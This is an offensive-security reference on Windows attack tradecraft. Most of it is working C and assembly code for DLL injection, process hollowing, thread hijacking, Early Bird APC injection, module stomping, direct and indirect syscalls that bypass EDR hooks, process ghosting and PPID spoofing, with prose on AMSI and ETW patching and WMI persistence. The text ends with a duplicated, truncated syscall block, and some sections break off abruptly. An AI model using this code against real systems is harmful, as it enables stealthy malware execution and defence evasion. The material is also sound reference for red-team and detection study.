Windows Offensive Security

Process Injection Techniques

Classic DLL Injection (CreateRemoteThread + LoadLibrary)

The oldest and most well-understood injection technique. The attacker opens a handle to the target process, allocates memory for a DLL path string, writes the path, then creates a remote thread whose start address is LoadLibraryA/LoadLibraryW in kernel32.dll. Because kernel32 is mapped at the same base across processes (ASLR per-boot, not per-process), the address resolved in the injector is valid in the target.

Detection surface: OpenProcess with PROCESS_ALL_ACCESS, VirtualAllocEx in remote process, WriteProcessMemory, CreateRemoteThread pointing to LoadLibrary. EDRs hook all of these in ntdll.

// Classic DLL Injection - Full implementation
#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProcess) return FALSE;

    // Allocate memory in target for the DLL path string
    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID remoteBuf = VirtualAllocEx(hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuf) { CloseHandle(hProcess); return FALSE; }

    // Write DLL path into target process memory
    WriteProcessMemory(hProcess, remoteBuf, dllPath, pathLen, NULL);

    // Resolve LoadLibraryA address (same across processes)
    FARPROC loadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    // Create remote thread starting at LoadLibraryA with our path as argument
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLib, remoteBuf, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, remoteBuf, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

Reflective DLL Injection

Invented by Stephen Fewer. The DLL is never written to disk and never registered with the PEB's module list (LDR_DATA_TABLE_ENTRY). Instead, the raw DLL bytes are written into the target process, and a small bootstrap (the "reflective loader") inside the DLL maps itself: parses its own PE headers, resolves imports, applies relocations, calls DllMain. The loader is position-independent and typically found via an exported function (ReflectiveLoader).

Key steps inside the reflective loader:

  1. Walk PEB → PEB_LDR_DATA → InMemoryOrderModuleList to find kernel32 base
  2. Manually resolve VirtualAlloc, LoadLibraryA, GetProcAddress
  3. Allocate memory at preferred base (or relocate)
  4. Copy PE sections to correct RVAs
  5. Process relocation table (.reloc) if rebased
  6. Walk import directory, load dependent DLLs, resolve IAT
  7. Set section memory protections (PAGE_EXECUTE_READ for .text, etc.)
  8. Call TLS callbacks, then DllMain(DLL_PROCESS_ATTACH)
// Simplified Reflective Loader concept (position-independent)
// This runs INSIDE the target process after raw bytes are injected

// Step 1: Find our own base by walking backwards from current EIP
ULONG_PTR findOwnBase(void) {
    ULONG_PTR addr = (ULONG_PTR)findOwnBase; // approximate
    // Walk backwards to find MZ header
    while (TRUE) {
        addr &= ~0xFFF; // page-align
        if (((PIMAGE_DOS_HEADER)addr)->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(addr +
                ((PIMAGE_DOS_HEADER)addr)->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE)
                return addr;
        }
        addr -= 0x1000;
    }
}

// Step 2: Find kernel32 via PEB
ULONG_PTR findKernel32(void) {
    // TEB at gs:[0x30] on x64, fs:[0x30] on x86
    PPEB peb;
    #ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
    #else
    peb = (PPEB)__readfsdword(0x30);
    #endif
    
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink; // first = ntdll, second = kernel32
    entry = entry->Flink; // skip ntdll
    // The containing structure is LDR_DATA_TABLE_ENTRY
    PLDR_DATA_TABLE_ENTRY ldrEntry = CONTAINING_RECORD(
        entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (ULONG_PTR)ldrEntry->DllBase;
}

Process Hollowing (RunPE)

Creates a legitimate process in SUSPENDED state, unmaps its original image, writes a malicious PE in its place, fixes the entry point in the thread context, then resumes. The malicious code runs under the identity of the hollowed process.

Complete flow:

  1. CreateProcess with CREATE_SUSPENDED flag
  2. NtQueryInformationProcess to get PEB address → read ImageBaseAddress
  3. NtUnmapViewOfSection to unmap original executable
  4. VirtualAllocEx at target's preferred base with full RWX
  5. Write PE headers + all sections with correct section alignment
  6. If rebased: apply relocations to the written image
  7. SetThreadContext to update RCX/EAX (entry point) in suspended thread
  8. Update PEB's ImageBaseAddress if base changed
  9. ResumeThread — code executes as the hollow process
// Process Hollowing skeleton
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

void HollowProcess(const char* targetExe, LPVOID payloadPE) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // 1. Create target suspended
    CreateProcessA(targetExe, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // 2. Get target PEB to find image base
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // Read PEB->ImageBaseAddress (offset 0x10 in x64 PEB)
    ULONG_PTR pebAddr;
    #ifdef _WIN64
    pebAddr = ctx.Rdx; // RDX points to PEB on x64 CreateProcess
    #else
    pebAddr = ctx.Ebx; // EBX points to PEB on x86
    #endif
    
    LPVOID targetImageBase;
    ReadProcessMemory(pi.hProcess,
        (LPVOID)(pebAddr + (sizeof(PVOID) * 2)), // ImageBaseAddress offset
        &targetImageBase, sizeof(LPVOID), NULL);
    
    // 3. Unmap original image
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmap(pi.hProcess, targetImageBase);
    
    // 4. Parse payload PE headers
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)payloadPE;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)
        ((ULONG_PTR)payloadPE + dosHdr->e_lfanew);
    
    // 5. Allocate at preferred base
    LPVOID newBase = VirtualAllocEx(pi.hProcess, 
        (LPVOID)ntHdr->OptionalHeader.ImageBase,
        ntHdr->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 6. Write headers
    WriteProcessMemory(pi.hProcess, newBase, payloadPE,
        ntHdr->OptionalHeader.SizeOfHeaders, NULL);
    
    // 7. Write sections
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);
    for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (LPVOID)((ULONG_PTR)newBase + sec[i].VirtualAddress),
            (LPVOID)((ULONG_PTR)payloadPE + sec[i].PointerToRawData),
            sec[i].SizeOfRawData, NULL);
    }
    
    // 8. Update entry point in thread context
    #ifdef _WIN64
    ctx.Rcx = (ULONG_PTR)newBase + ntHdr->OptionalHeader.AddressOfEntryPoint;
    #else
    ctx.Eax = (ULONG_PTR)newBase + ntHdr->OptionalHeader.AddressOfEntryPoint;
    #endif
    SetThreadContext(pi.hThread, &ctx);
    
    // 9. Update PEB->ImageBaseAddress
    WriteProcessMemory(pi.hProcess,
        (LPVOID)(pebAddr + (sizeof(PVOID) * 2)),
        &newBase, sizeof(LPVOID), NULL);
    
    // 10. Resume
    ResumeThread(pi.hThread);
}

Thread Hijacking

Instead of creating a new remote thread (which is highly monitored), hijack an existing thread in the target process. Suspend it, inject shellcode, modify RIP/EIP to point to shellcode, resume. Optionally restore original context after shellcode completes via a trampoline.

// Thread Hijacking
void HijackThread(DWORD pid, LPVOID shellcode, SIZE_T scSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Allocate executable memory for shellcode
    LPVOID remoteSc = VirtualAllocEx(hProcess, NULL, scSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteSc, shellcode, scSize, NULL);
    
    // Find a thread in target process (use toolhelp)
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    HANDLE hThread = NULL;
    
    Thread32First(hSnap, &te);
    do {
        if (te.th32OwnerProcessID == pid) {
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
            break;
        }
    } while (Thread32Next(hSnap, &te));
    CloseHandle(hSnap);
    
    // Suspend target thread and modify its context
    SuspendThread(hThread);
    
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    
    #ifdef _WIN64
    ctx.Rip = (ULONG_PTR)remoteSc;
    #else
    ctx.Eip = (ULONG_PTR)remoteSc;
    #endif
    
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

APC Injection (QueueUserAPC)

Asynchronous Procedure Calls (APCs) are queued to a thread and execute when the thread enters an alertable wait state (SleepEx, WaitForSingleObjectEx, MsgWaitForMultipleObjectsEx with bAlertable=TRUE). The "Early Bird" variant queues the APC to a newly created suspended thread (before it runs any code), guaranteeing execution before AV hooks initialize.

// Early Bird APC Injection
void EarlyBirdAPC(const char* targetExe, LPVOID shellcode, SIZE_T scSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Create process SUSPENDED — main thread hasn't run yet
    CreateProcessA(targetExe, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Allocate + write shellcode
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, scSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, scSize, NULL);
    
    // Queue APC to the suspended main thread
    // When thread resumes, it enters alertable wait during init → APC fires
    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);
    
    // Resume thread — APC executes before ntdll!LdrInitializeThunk completes
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

Module Stomping

Load a legitimate DLL into the target process, then overwrite its .text section with shellcode. The code executes from a valid, signed module's memory region. EDR sees a thread executing inside a known-good DLL. Choose a DLL that's rarely used so overwriting doesn't crash the process (e.g., amsi.dll, wldp.dll, or a large unused DLL).

// Module Stomping concept
void ModuleStomp(HANDLE hProcess, const char* sacrificialDll,
                 LPVOID shellcode, SIZE_T scSize) {
    // Load the sacrificial DLL into target
    // (use standard DLL injection first, or find already-loaded one)
    
    // Find .text section of the DLL in target
    HMODULE hMod = NULL; // resolve via EnumProcessModules
    MODULEINFO modInfo;
    GetModuleInformation(hProcess, hMod, &modInfo, sizeof(modInfo));
    
    // Parse PE headers to find .text section RVA
    IMAGE_DOS_HEADER dosHdr;
    ReadProcessMemory(hProcess, modInfo.lpBaseOfDll, &dosHdr, sizeof(dosHdr), NULL);
    
    IMAGE_NT_HEADERS ntHdr;
    ReadProcessMemory(hProcess,
        (LPVOID)((ULONG_PTR)modInfo.lpBaseOfDll + dosHdr.e_lfanew),
        &ntHdr, sizeof(ntHdr), NULL);
    
    IMAGE_SECTION_HEADER secHdr;
    LPVOID secAddr = (LPVOID)((ULONG_PTR)modInfo.lpBaseOfDll +
        dosHdr.e_lfanew + sizeof(IMAGE_NT_HEADERS));
    
    for (int i = 0; i < ntHdr.FileHeader.NumberOfSections; i++) {
        ReadProcessMemory(hProcess,
            (LPVOID)((ULONG_PTR)secAddr + i * sizeof(IMAGE_SECTION_HEADER)),
            &secHdr, sizeof(secHdr), NULL);
        if (memcmp(secHdr.Name, ".text", 5) == 0) break;
    }
    
    LPVOID textSection = (LPVOID)((ULONG_PTR)modInfo.lpBaseOfDll +
        secHdr.VirtualAddress);
    
    // Make .text writable, overwrite with shellcode
    DWORD oldProtect;
    VirtualProtectEx(hProcess, textSection, scSize, PAGE_READWRITE, &oldProtect);
    WriteProcessMemory(hProcess, textSection, shellcode, scSize, NULL);
    VirtualProtectEx(hProcess, textSection, scSize, PAGE_EXECUTE_READ, &oldProtect);
    
    // Execute via CreateRemoteThread pointing into the "legitimate" DLL
    CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)textSection, NULL, 0, NULL);
}

Direct Syscalls (Hell's Gate, Halo's Gate, SysWhispers)

EDR products hook ntdll.dll functions (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, etc.) by placing JMP instructions at their entry points. Direct syscalls bypass these hooks entirely by invoking the syscall instruction directly with the correct System Service Number (SSN).

Hell's Gate: Reads ntdll.dll in memory, parses the mov r10, rcx / mov eax, SSN pattern at the beginning of each Nt* function to extract the SSN dynamically at runtime. If the function is hooked (JMP at start), it fails.

Halo's Gate: Extension of Hell's Gate — if the target function is hooked, look at neighboring syscall stubs (±1, ±2...) to find an unhooked one and calculate the target SSN by offset.

SysWhispers: Generates header files with embedded assembly stubs for direct syscalls. SysWhispers2 uses random syscall jumps. SysWhispers3 adds indirect syscalls.

// Direct Syscall stub (x64 MASM)
// NtAllocateVirtualMemory SSN = 0x18 (Windows 10 1903+, varies by build)
.code
NtAllocateVirtualMemory PROC
    mov r10, rcx          ; standard syscall convention
    mov eax, 18h          ; SSN for NtAllocateVirtualMemory
    syscall               ; transition to kernel
    ret
NtAllocateVirtualMemory ENDP

// Hell's Gate - Dynamic SSN resolution
DWORD GetSSN(LPVOID ntFuncAddr) {
    // Clean syscall stub pattern:
    // 4C 8B D1      mov r10, rcx
    // B8 xx xx 00 00  mov eax, SSN
    BYTE* func = (BYTE*)ntFuncAddr;
    
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 &&  // mov r10, rcx
        func[3] == 0xB8) {                                         // mov eax, imm32
        // Not hooked — extract SSN directly
        return *(DWORD*)(func + 4);
    }
    
    // Hooked! Use Halo's Gate — check neighbors
    for (int i = 1; i < 500; i++) {
        // Check downward neighbor
        BYTE* neighbor = func + (i * 32); // syscall stubs are 32 bytes apart
        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 &&
            neighbor[3] == 0xB8) {
            return *(DWORD*)(neighbor + 4) - i; // subtract offset
        }
        // Check upward neighbor
        neighbor = func - (i * 32);
        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 &&
            neighbor[3] == 0xB8) {
            return *(DWORD*)(neighbor + 4) + i; // add offset
        }
    }
    return 0; // failed
}

Indirect Syscalls

Direct syscalls have a tell: the syscall instruction executes from outside ntdll.dll. ETW/kernel callbacks can detect this by checking the return address. Indirect syscalls solve this by JMPing to the syscall; ret instruction within the legitimate ntdll stub, so the return address appears to originate from ntdll.

// Indirect Syscall concept (x64)
// Instead of executing 'syscall' directly, JMP to ntdll's syscall instruction
.code
NtAllocateVirtualMemory_Indirect PROC
    mov r10, rcx
    mov eax, 18h              ; SSN
    jmp qword ptr [syscallAddr] ; jump to ntdll!NtAllocateVirtualMemory+0x12
                               ; (the 'syscall' instruction inside ntdll)
NtAllocateVirtualMemory_Indirect ENDP

// Finding the syscall instruction address in ntdll:
LPVOID FindSyscallInstruction(LPVOID ntFunc) {
    BYTE* p = (BYTE*)ntFunc;
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0x0F && p[i+1] == 0x05) { // syscall opcode
            return &p[i];
        }
    }
    return NULL;
}

Process Ghosting, Doppelganging, Transacted Hollowing

Process Doppelganging: Uses NTFS transactions (TxF). Create a transaction → write malicious PE to a transacted file → create section from transacted file → rollback transaction (file disappears from disk) → create process from the in-memory section. The file was never actually committed to disk.

Process Ghosting: Exploits a gap in the Windows delete-pending state. Create a file → set it to delete-pending (NtSetInformationFile with FileDispositionInformation) → write payload → create image section (succeeds because file is still technically open) → close file handle (file gets deleted) → create process from section. The executable is deleted before the process starts running.

Transacted Hollowing: Combines TxF with hollowing. Create a transaction, write payload into a transacted file, map it into target process, rollback. Similar to doppelganging but used to inject into existing processes.

// Process Ghosting flow
#include <winternl.h>

void ProcessGhosting(LPVOID payload, DWORD payloadSize) {
    // 1. Create temp file
    HANDLE hFile = CreateFileW(L"C:\\Temp\\ghost.exe",
        GENERIC_READ | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    // 2. Set delete-pending BEFORE writing content
    FILE_DISPOSITION_INFORMATION fdi = { TRUE };
    IO_STATUS_BLOCK iosb;
    NtSetInformationFile(hFile, &iosb, &fdi, sizeof(fdi),
        FileDispositionInformation);
    
    // 3. Write payload to the delete-pending file
    DWORD written;
    WriteFile(hFile, payload, payloadSize, &written, NULL);
    
    // 4. Create image section from the file
    HANDLE hSection = NULL;
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
        PAGE_READONLY, SEC_IMAGE, hFile);
    
    // 5. Close file handle → file is deleted from disk
    CloseHandle(hFile);
    // File is now GONE from the filesystem
    
    // 6. Create process from the ghost section
    HANDLE hProcess = NULL;
    NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
        NtCurrentProcess(), 0, hSection, NULL, NULL, 0);
    
    // 7. Set up process parameters, create initial thread, etc.
    // ... (requires NtCreateThreadEx, RtlCreateProcessParametersEx)
}

ETW/AMSI Patching

AMSI (Antimalware Scan Interface): Loaded as amsi.dll into PowerShell, .NET, VBScript, JScript, etc. The key function is AmsiScanBuffer. Patching its first bytes to return AMSI_RESULT_CLEAN (or just ret) disables all script-based scanning.

ETW (Event Tracing for Windows): EtwEventWrite in ntdll.dll is used to log events. Patching it to immediately return disables telemetry that EDRs consume. The patch target is ntdll!EtwEventWrite.

PPID Spoofing

Spoof the parent process of a new process using PROC_THREAD_ATTRIBUTE_PARENT_PROCESS in the STARTUPINFOEX structure. Makes the new process appear to be spawned by a different parent (e.g., explorer.exe), evading process-tree-based detection.

// PPID Spoofing
BOOL SpawnWithSpoofedParent(DWORD spoofedParentPid, const char* childExe) {
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoofedParentPid);
    
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    
    LPPROC_THREAD_ATTRIBUTE_LIST attrList = 
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize);
    
    UpdateProcThreadAttribute(attrList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(HANDLE), NULL, NULL);
    
    STARTUPINFOEXA si = { 0 };
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attrList;
    
    PROCESS_INFORMATION pi;
    CreateProcessA(childExe, NULL, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi);
    
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);
    return TRUE;
}

UAC Bypass Techniques

UAC Architecture

When an admin user logs in, two tokens are created: a filtered token (standard user, used by default) and a full admin token (kept by the system). Elevation occurs via consent.exe displaying the UAC prompt, or silently for auto-elevating binaries. The integrity level of processes is tracked: Low → Medium → High → System.

Auto-elevating conditions:

  • Executable is signed by Microsoft
  • Manifest contains <autoElevate>true</autoElevate>
  • Located in a secure directory (C:\Windows\System32)

WMI for Offense

WMI Architecture

WMI (Windows Management Instrumentation) is built on CIM (Common Information Model). Components: WMI Service (winmgmt), CIM Repository (OBJECTS.DATA at %SystemRoot%\System32\wbem\Repository), WMI Providers (DLLs that implement classes), MOF files (Managed Object Format, schema definitions).

WMI is powerful for offense because: process creation has no direct parent-child relationship (wmiprvse.exe spawns), it's built into all Windows versions, supports remote execution natively via DCOM/WinRM.

WMI event subscriptions survive reboots. Three components are needed: an EventFilter (trigger condition), an EventConsumer (action to take), and a FilterToConsumerBinding (links them). This is extremely stealthy persistence — no files, no registry run keys, no scheduled tasks visible in Task Scheduler.

Token Privileges

SeImpersonatePrivilege: Allows impersonating any token obtained via handle. Granted to: LOCAL SERVICE, NETWORK SERVICE, IIS AppPool, SQL Server service accounts. This is the prerequisite for all Potato attacks.

SeAssignPrimaryTokenPrivilege: Allows assigning a primary token to a process (CreateProcessAsUser). Combined with SeImpersonate, enables full token theft.

#include <windows.h>

// Key: The 'syscall' instruction must execute from within ntdll's range

#include <windows.h>

// Structure to hold syscall info
typedef struct _SYSCALL_ENTRY {
    DWORD ssn;          // System Service Number
    PVOID syscallAddr;  // Address of 'syscall' instruction in ntdll
} SYSCALL_ENTRY;

// Find the 'syscall' instruction within an ntdll function
PVOID FindSyscallInstruction(PVOID ntFunc) {
    BYTE* p = (BYTE*)ntFunc;
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0x0F && p[i+1] == 0x05) // 'syscall' opcode
            return &p[i];
    }
    return NULL;
}

// Resolve SSN + syscall addr for a function
SYSCALL_ENTRY ResolveSyscall(const char* funcName) {
    SYSCALL_ENTRY entry = {0};
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* func = (BYTE*)GetProcAddress(hNtdll, funcName);
    
    // Walk neighbors if hooked (Halo's Gate)
    for (int i = 0; i < 500; i++) {
        BYTE* check = func + (i * 32);
        if (check[0] == 0x4C && check[1] == 0x8B && check[2] == 0xD1 &&
            check[3] == 0xB8) {
            entry.ssn = *(DWORD*)(check + 4) - i;
            entry.syscallAddr = FindSyscallInstruction(check);
            return entry;
